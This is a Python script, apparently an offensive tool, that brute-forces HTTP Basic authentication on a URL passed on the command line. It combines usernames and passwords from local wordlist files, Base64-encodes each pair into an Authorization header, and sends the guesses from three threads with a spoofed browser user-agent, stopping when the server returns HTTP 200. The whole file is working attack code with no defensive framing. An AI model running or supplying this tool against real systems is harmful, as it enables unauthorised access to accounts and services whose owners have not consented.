import requests
import sys,os,time,base64,threading,concurrent.futures
thread_num=3
proxies={
'all':'http://127.0.0.1:8080'
}
proxies={}
upb64=[]
error=[]
times=0
lenth=0
flag=False
def basic_auth():
    global upb64,lenth
    basepath=os.path.split(os.path.abspath(__file__))[0]
    user=basepath+'\\user.txt'
    pass_=basepath+'\\pass.txt'
    uspa=basepath+'\\uspa.txt'
    with open(user,'r',encoding='utf-8',errors='ignore') as f:
        user=f.read().splitlines(False)
    with open(pass_,'r',encoding='utf-8',errors='ignore') as f:
        pass_=f.read().splitlines(False)
    for i in user:
        for j in pass_:
            line=(i+':'+j)
            upb64.append(line)
    with open(uspa,'r',encoding='utf-8',errors='ignore') as f:
        uspa=f.read().splitlines(False)
    for line in uspa:
        upb64.append(line)
    upb64=list(set(upb64))
    lenth=len(upb64)

class myprogress():
    def __init__(self):
        self.lock=threading.Lock()
        self.task_handler_list=[]
        self.thread_pool=concurrent.futures.ThreadPoolExecutor(thread_num)
    def brute_force_basic_auth(self):
        global upb64,times,proxies,flag
        self.lock.acquire()
        while len(upb64)>0 and flag==False:
            long=len(upb64)
            line=upb64.pop(long-1)
            self.lock.release()
            aut='Basic '+str(base64.b64encode(line.encode("utf-8")), "utf-8")
            headers={
            'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36 Edg/92.0.902.84',
            'Authorization':aut
            }
            try:
                res=requests.get(sys.argv[1],proxies=proxies,headers=headers,timeout=10)
            except Exception:
                times=times+1
                error.append(line)
                if times>5:
                    print('timeout!!!')
                    exit()
                self.lock.acquire()
            else:
                if res.status_code != 401:
                    print(res.text)
                    if res.status_code == 200:
                        flag = True
                        print('\nBrute force success!\n',line,' '*20)
                else:
                    print(line,' '*3,'\t',lenth,'\\',long,' '*10,'\r',end='')
                    self.lock.acquire()
        try:
            self.lock.release()
        except Exception:
            pass
    def main(self):
        for i in range(thread_num):
            self.task_handler_list.append(self.thread_pool.submit(self.brute_force_basic_auth,))
        while len(self.task_handler_list)>0:
            for i in self.task_handler_list:
                if i.done():
                    self.task_handler_list.remove(i)
            time.sleep(1)
        if len(error)>0:
            print(' '*100,'\r','error:')
            for i in error:print(i)
        print('Brute force complete!',' '*20)
if __name__=='__main__':
  basic_auth()
  myprogress().main()
